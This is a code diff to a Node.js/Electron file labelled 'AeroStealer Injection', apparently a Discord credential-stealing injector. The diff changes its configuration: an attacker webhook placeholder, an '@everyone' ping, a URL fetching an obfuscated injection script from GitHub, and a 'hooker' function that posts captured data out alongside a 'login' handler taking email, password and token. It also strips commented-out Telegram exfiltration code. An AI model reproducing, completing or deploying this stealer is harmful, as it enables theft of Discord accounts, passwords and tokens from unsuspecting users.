@@ -3,7 +3,6 @@ const fs = require('fs');
 const path = require('path');
 const https = require('https');
 const querystring = require('querystring');
-// const TelegramBot = require('node-telegram-bot-api');
 const { BrowserWindow, session } = require('electron');
 const encodedHook = '%WEBHOOKHEREBASE64ENCODED%'
 
@@ -13,9 +12,8 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone',
-  // bot_token: 'Token Bot Telegram',
   embed_name: 'AeroStealer Injection', 
-  embed_icon: 'https://raw.githubusercontent.com/Rolaco0/Rolacoim/main/mascot.png',
+  embed_icon: 'https://cdn.discordapp.com/attachments/1234289355531620373/1247576135240388788/gif.gif?ex=66608751&is=665f35d1&hm=d33b16cc292696f95322ce7e6a86c671d49901687e4002c92f9e1f1de9139904&',
   embed_color: 5639644, 
   injection_url: 'https://raw.githubusercontent.com/HumanQueen/Discord-Injection-AS/main/injection-obfuscated.js',
 
@@ -655,10 +653,6 @@ const hooker = async (content) => {
   });
   req.write(data);
   req.end();
-
-  // const chatId = ["CHAT ID"];
-  // const telegramMessage = 'Nouvelle mise a jour:' + JSON.stringify(content);
-  // bot_token.sendMessage(chatId, telegramMessage);
 };
 
 const login = async (email, password, token) => {
